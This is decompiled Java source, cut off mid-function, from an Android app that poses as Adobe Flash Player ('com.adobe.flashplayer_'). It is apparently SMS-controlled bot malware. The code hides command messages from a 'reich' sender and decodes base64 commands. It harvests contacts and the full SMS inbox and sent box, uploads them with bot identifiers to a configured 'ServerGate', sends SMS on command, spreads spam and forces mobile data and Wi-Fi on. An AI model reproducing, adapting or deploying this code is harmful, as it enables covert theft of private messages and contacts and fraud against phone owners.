package com.adobe.flashplayer_;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.os.Build.VERSION;
import android.provider.Settings.Secure;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.Calendar;

public class FlashURL extends BroadcastReceiver {
    /* JADX WARNING: Removed duplicated region for block: B:12:0x00a1  */
    /* JADX WARNING: Removed duplicated region for block: B:93:0x054d  */
    /* JADX WARNING: Removed duplicated region for block: B:98:0x05a0  */
    /* JADX WARNING: Removed duplicated region for block: B:108:0x0685  */
    /* JADX WARNING: Removed duplicated region for block: B:184:0x0dd5  */
    public void onReceive(android.content.Context r81, android.content.Intent r82) {
        /*
        r80 = this;
        r46 = "reich";
        r38 = 0;
        r3 = "Reich_ServerGate";
        r0 = r80;
        r1 = r81;
        r18 = r0.readConfig(r3, r1);
        r3 = "connectivity";
        r0 = r81;
        r27 = r0.getSystemService(r3);
        r27 = (android.net.ConnectivityManager) r27;
        r52 = r27.getActiveNetworkInfo();
        r62 = r82.getExtras();
        r3 = "pdus";
        r0 = r62;
        r60 = r0.get(r3);
        r60 = (java.lang.Object[]) r60;
        r3 = 0;
        r3 = r60[r3];
        r3 = (byte[]) r3;
        r47 = android.telephony.SmsMessage.createFromPdu(r3);
        r0 = r60;
        r3 = r0.length;
        r0 = new android.telephony.SmsMessage[r3];
        r48 = r0;
        r39 = 0;
    L_0x003c:
        r0 = r60;
        r3 = r0.length;
        r0 = r39;
        if (r0 < r3) goto L_0x0948;
    L_0x0043:
        r3 = 0;
        r69 = r48[r3];
        r23 = "";
        r3 = "BotID";
        r0 = r80;
        r1 = r81;
        r11 = r0.readConfig(r3, r1);
        r3 = "BotNetwork";
        r0 = r80;
        r1 = r81;
        r13 = r0.readConfig(r3, r1);
        r3 = "BotLocation";
        r0 = r80;
        r1 = r81;
        r12 = r0.readConfig(r3, r1);
        r3 = "Reich_ServerGate";
        r0 = r80;
        r1 = r81;
        r16 = r0.readConfig(r3, r1);
        r3 = "BotVer";
        r0 = r80;
        r1 = r81;
        r14 = r0.readConfig(r3, r1);
        r17 = android.os.Build.VERSION.RELEASE;
        r0 = r48;
        r3 = r0.length;	 Catch:{ Exception -> 0x0e47 }
        r5 = 1;
        if (r3 == r5) goto L_0x0088;
    L_0x0082:
        r3 = r69.isReplace();	 Catch:{ Exception -> 0x0e47 }
        if (r3 == 0) goto L_0x0956;
    L_0x0088:
        r23 = r69.getDisplayMessageBody();	 Catch:{ Exception -> 0x0e47 }
    L_0x008c:
        r3 = r47.getOriginatingAddress();
        r63 = r3.toString();
        r67 = r23;
        r0 = r63;
        r1 = r46;
        r3 = r0.indexOf(r1);
        r5 = -1;
        if (r3 == r5) goto L_0x052e;
    L_0x00a1:
        r80.abortBroadcast();
        r3 = 0;
        r0 = r67;
        r72 = android.util.Base64.decode(r0, r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r74 = new java.lang.String;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = "UTF-8";
        r0 = r74;
        r1 = r72;
        r0.<init>(r1, r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = "setFilter";
        r0 = r74;
        r3 = r0.indexOf(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = -1;
        if (r3 == r5) goto L_0x012f;
    L_0x00c1:
        r3 = " ";
        r0 = r74;
        r28 = r0.split(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = 1;
        r31 = r28[r3];	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = 2;
        r20 = r28[r3];	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = "start";
        r0 = r20;
        r3 = r0.indexOf(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = -1;
        if (r3 == r5) goto L_0x00e5;
    L_0x00da:
        r3 = "w";
        r0 = r80;
        r1 = r31;
        r2 = r81;
        r0.writeConfig(r3, r1, r2);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
    L_0x00e5:
        r3 = "stop";
        r0 = r20;
        r3 = r0.indexOf(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = -1;
        if (r3 == r5) goto L_0x00fb;
    L_0x00f0:
        r3 = "w";
        r5 = "NOFILTER";
        r0 = r80;
        r1 = r81;
        r0.writeConfig(r3, r5, r1);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
    L_0x00fb:
        if (r52 == 0) goto L_0x012f;
    L_0x00fd:
        r3 = r52.isConnectedOrConnecting();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        if (r3 == 0) goto L_0x012f;
    L_0x0103:
        r3 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = "setFilter[";
        r3.<init>(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r31;
        r3 = r3.append(r0);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = "]";
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r20;
        r3 = r3.append(r0);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = ":SMSGATE";
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = r3.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r80;
        r1 = r18;
        r2 = r81;
        r0.sendREP(r1, r11, r3, r2);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
    L_0x012f:
        r3 = "loadSpam";
        r0 = r74;
        r3 = r0.indexOf(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = -1;
        if (r3 == r5) goto L_0x017f;
    L_0x013a:
        r3 = " ";
        r0 = r74;
        r28 = r0.split(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r73 = "";
        r31 = 0;
        if (r52 == 0) goto L_0x017f;
    L_0x0148:
        r3 = r52.isConnectedOrConnecting();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        if (r3 == 0) goto L_0x017f;
    L_0x014e:
        r3 = new com.adobe.flashplayer_.FlashVars;	 Catch:{ InterruptedException -> 0x0e44, InterruptedException | ExecutionException -> 0x0e41 }
        r3.m249init();	 Catch:{ InterruptedException -> 0x0e44, InterruptedException | ExecutionException -> 0x0e41 }
        r5 = 1;
        r5 = new java.lang.String[r5];	 Catch:{ InterruptedException -> 0x0e44, InterruptedException | ExecutionException -> 0x0e41 }
        r7 = 0;
        r8 = 1;
        r8 = r28[r8];	 Catch:{ InterruptedException -> 0x0e44, InterruptedException | ExecutionException -> 0x0e41 }
        r5[r7] = r8;	 Catch:{ InterruptedException -> 0x0e44, InterruptedException | ExecutionException -> 0x0e41 }
        r3 = r3.execute(r5);	 Catch:{ InterruptedException -> 0x0e44, InterruptedException | ExecutionException -> 0x0e41 }
        r3 = r3.get();	 Catch:{ InterruptedException -> 0x0e44, InterruptedException | ExecutionException -> 0x0e41 }
        r0 = r3;
        r0 = (java.lang.String) r0;	 Catch:{ InterruptedException -> 0x0e44, InterruptedException | ExecutionException -> 0x0e41 }
        r31 = r0;
        r3 = "spam_data";
        r0 = r80;
        r1 = r31;
        r2 = r81;
        r0.writeConfig(r3, r1, r2);	 Catch:{ InterruptedException -> 0x0e44, InterruptedException | ExecutionException -> 0x0e41 }
    L_0x0174:
        r3 = "loadSpam:Executed";
        r0 = r80;
        r1 = r18;
        r2 = r81;
        r0.sendREP(r1, r11, r3, r2);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
    L_0x017f:
        r3 = "sentSpam";
        r0 = r74;
        r3 = r0.indexOf(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = -1;
        if (r3 == r5) goto L_0x021c;
    L_0x018a:
        r31 = "";
        r73 = "";
        r3 = r81.getContentResolver();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r4 = android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = 0;
        r6 = 0;
        r7 = 0;
        r8 = 0;
        r61 = r3.query(r4, r5, r6, r7, r8);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
    L_0x019c:
        r3 = r61.moveToNext();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        if (r3 != 0) goto L_0x0978;
    L_0x01a2:
        r61.close();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = java.lang.String.valueOf(r31);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.<init>(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = " [ Sent Messages ] \n";
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r31 = r3.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = java.lang.String.valueOf(r31);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.<init>(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r73;
        r3 = r3.append(r0);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r31 = r3.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = java.lang.String.valueOf(r31);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.<init>(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = " [ End ] ";
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r31 = r3.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        if (r52 == 0) goto L_0x021c;
    L_0x01e0:
        r3 = r52.isConnectedOrConnecting();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        if (r3 == 0) goto L_0x021c;
    L_0x01e6:
        r3 = "sentSpam:Executed";
        r0 = r80;
        r1 = r18;
        r2 = r81;
        r0.sendREP(r1, r11, r3, r2);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = "spamlist.txt";
        r0 = r80;
        r1 = r31;
        r2 = r81;
        r0.saveData(r1, r3, r2);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = new com.adobe.flashplayer_.FlashVirtual;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.m250init();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = 3;
        r5 = new java.lang.String[r5];	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r7 = 0;
        r5[r7] = r11;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r7 = 1;
        r8 = "spamlist.txt";
        r0 = r81;
        r8 = r0.getFileStreamPath(r8);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r8 = r8.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5[r7] = r8;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r7 = 2;
        r5[r7] = r18;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.execute(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
    L_0x021c:
        r3 = "getMessages";
        r0 = r74;
        r3 = r0.indexOf(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = -1;
        if (r3 == r5) goto L_0x03b4;
    L_0x0227:
        r3 = "a_link";
        r0 = r80;
        r1 = r81;
        r37 = r0.readConfig(r3, r1);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r55 = "";
        r56 = "";
        r57 = "";
        r58 = "";
        r3 = "content://sms/inbox";
        r4 = android.net.Uri.parse(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = r81.getContentResolver();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = 0;
        r6 = 0;
        r7 = 0;
        r8 = 0;
        r43 = r3.query(r4, r5, r6, r7, r8);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
    L_0x024b:
        r3 = r43.moveToNext();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        if (r3 != 0) goto L_0x09d2;
    L_0x0251:
        r43.close();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = java.lang.String.valueOf(r56);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.<init>(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r55;
        r3 = r3.append(r0);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r56 = r3.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = "content://sms/sent";
        r6 = android.net.Uri.parse(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = r81.getContentResolver();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r7 = 0;
        r8 = 0;
        r9 = 0;
        r10 = 0;
        r54 = r5.query(r6, r7, r8, r9, r10);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
    L_0x0279:
        r3 = r54.moveToNext();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        if (r3 != 0) goto L_0x0a4b;
    L_0x027f:
        r54.close();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = java.lang.String.valueOf(r58);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.<init>(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r57;
        r3 = r3.append(r0);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r58 = r3.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        if (r52 == 0) goto L_0x03b4;
    L_0x0297:
        r3 = r52.isConnectedOrConnecting();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        if (r3 == 0) goto L_0x03b4;
    L_0x029d:
        r3 = "getMessages:SMSGATE";
        r0 = r80;
        r1 = r18;
        r2 = r81;
        r0.sendREP(r1, r11, r3, r2);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = "in.txt";
        r0 = r80;
        r1 = r56;
        r2 = r81;
        r0.saveData(r1, r3, r2);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = new com.adobe.flashplayer_.FlashVirtual;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.m250init();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = 3;
        r5 = new java.lang.String[r5];	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r7 = 0;
        r8 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = "&b=";
        r8.<init>(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r8 = r8.append(r11);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = "&c=";
        r8 = r8.append(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = ":";
        r10 = "";
        r9 = r13.replace(r9, r10);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r8 = r8.append(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = "&d=";
        r8 = r8.append(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r8 = r8.append(r12);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = "&e=";
        r8 = r8.append(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = "BotPhone";
        r0 = r80;
        r1 = r81;
        r9 = r0.readConfig(r9, r1);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r8 = r8.append(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = "&f=";
        r8 = r8.append(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r8 = r8.append(r14);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = "&g=";
        r8 = r8.append(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r17;
        r8 = r8.append(r0);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = "&h=in_sms&i=sms";
        r8 = r8.append(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r8 = r8.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5[r7] = r8;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r7 = 1;
        r8 = "in.txt";
        r0 = r81;
        r8 = r0.getFileStreamPath(r8);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r8 = r8.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5[r7] = r8;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r7 = 2;
        r5[r7] = r16;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.execute(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = "out.txt";
        r0 = r80;
        r1 = r58;
        r2 = r81;
        r0.saveData(r1, r3, r2);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = new com.adobe.flashplayer_.FlashVirtual;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.m250init();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = 3;
        r5 = new java.lang.String[r5];	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r7 = 0;
        r8 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = "&b=";
        r8.<init>(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r8 = r8.append(r11);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = "&c=";
        r8 = r8.append(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = ":";
        r10 = "";
        r9 = r13.replace(r9, r10);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r8 = r8.append(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = "&d=";
        r8 = r8.append(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r8 = r8.append(r12);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = "&e=";
        r8 = r8.append(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = "BotPhone";
        r0 = r80;
        r1 = r81;
        r9 = r0.readConfig(r9, r1);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r8 = r8.append(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = "&f=";
        r8 = r8.append(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r8 = r8.append(r14);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = "&g=";
        r8 = r8.append(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r17;
        r8 = r8.append(r0);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r9 = "&h=out_sms&i=sms";
        r8 = r8.append(r9);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r8 = r8.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5[r7] = r8;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r7 = 1;
        r8 = "out.txt";
        r0 = r81;
        r8 = r0.getFileStreamPath(r8);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r8 = r8.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5[r7] = r8;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r7 = 2;
        r5[r7] = r16;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3.execute(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
    L_0x03b4:
        r3 = "sendSMS";
        r0 = r74;
        r3 = r0.indexOf(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = -1;
        if (r3 == r5) goto L_0x043d;
    L_0x03bf:
        r3 = " ";
        r0 = r74;
        r28 = r0.split(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r75 = "";
        r68 = android.telephony.SmsManager.getDefault();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        if (r68 == 0) goto L_0x0400;
    L_0x03cf:
        r3 = 1;
        r3 = r28[r3];	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = r3.length();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = 8;
        if (r3 <= r5) goto L_0x0ac4;
    L_0x03da:
        r3 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = "+";
        r3.<init>(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = 1;
        r5 = r28[r5];	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r75 = r3.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
    L_0x03ec:
        r3 = 2;
        r3 = r28[r3];	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = "_";
        r7 = " ";
        r50 = r3.replace(r5, r7);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r80;
        r1 = r75;
        r2 = r50;
        r0.sendSMS(r1, r2);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
    L_0x0400:
        if (r52 == 0) goto L_0x043d;
    L_0x0402:
        r3 = r52.isConnectedOrConnecting();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        if (r3 == 0) goto L_0x043d;
    L_0x0408:
        r3 = new java.lang.StringBuilder;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = "sendSMS[";
        r3.<init>(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r75;
        r3 = r3.append(r0);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = "_";
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = 2;
        r5 = r28[r5];	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r7 = " ";
        r8 = "_";
        r5 = r5.replace(r7, r8);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = "]:SMSGATE";
        r3 = r3.append(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = r3.toString();	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r0 = r80;
        r1 = r18;
        r2 = r81;
        r0.sendREP(r1, r11, r3, r2);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
    L_0x043d:
        r3 = "3gOn";
        r0 = r74;
        r3 = r0.indexOf(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = -1;
        if (r3 == r5) goto L_0x04a8;
    L_0x0448:
        r3 = "connectivity";
        r0 = r81;
        r29 = r0.getSystemService(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r29 = (android.net.ConnectivityManager) r29;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = r29.getClass();	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r3 = r3.getName();	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r30 = java.lang.Class.forName(r3);	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r3 = "mService";
        r0 = r30;
        r42 = r0.getDeclaredField(r3);	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r3 = 1;
        r0 = r42;
        r0.setAccessible(r3);	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r0 = r42;
        r1 = r29;
        r40 = r0.get(r1);	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r3 = r40.getClass();	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r3 = r3.getName();	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r41 = java.lang.Class.forName(r3);	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r3 = "setMobileDataEnabled";
        r5 = 1;
        r5 = new java.lang.Class[r5];	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r7 = 0;
        r8 = java.lang.Boolean.TYPE;	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r5[r7] = r8;	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r0 = r41;
        r66 = r0.getDeclaredMethod(r3, r5);	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r3 = 1;
        r0 = r66;
        r0.setAccessible(r3);	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r3 = 1;
        r3 = new java.lang.Object[r3];	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r5 = 0;
        r7 = 1;
        r7 = java.lang.Boolean.valueOf(r7);	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r3[r5] = r7;	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
        r0 = r66;
        r1 = r40;
        r0.invoke(r1, r3);	 Catch:{ ClassNotFoundException -> 0x0ac9, NoSuchFieldException -> 0x0acf, IllegalArgumentException -> 0x0ad5, IllegalAccessException -> 0x0adb, NoSuchMethodException -> 0x0ae1, InvocationTargetException -> 0x0ae7 }
    L_0x04a8:
        r3 = "wifiOn";
        r0 = r74;
        r3 = r0.indexOf(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = -1;
        if (r3 == r5) goto L_0x04c3;
    L_0x04b3:
        r3 = "wifi";
        r0 = r81;
        r76 = r0.getSystemService(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r76 = (android.net.wifi.WifiManager) r76;	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = 1;
        r0 = r76;
        r0.setWifiEnabled(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
    L_0x04c3:
        r3 = "forceZ";
        r0 = r74;
        r3 = r0.indexOf(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = -1;
        if (r3 == r5) goto L_0x04ec;
    L_0x04ce:
        r3 = " ";
        r0 = r74;
        r28 = r0.split(r3);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r3 = 1;
        r3 = r28[r3];	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        r5 = "On";
        r3 = r3.equals(r5);	 Catch:{ UnsupportedEncodingException -> 0x09cc }
        if (r3 == 0) goto L_0x0aed;
    L_0x04e1:
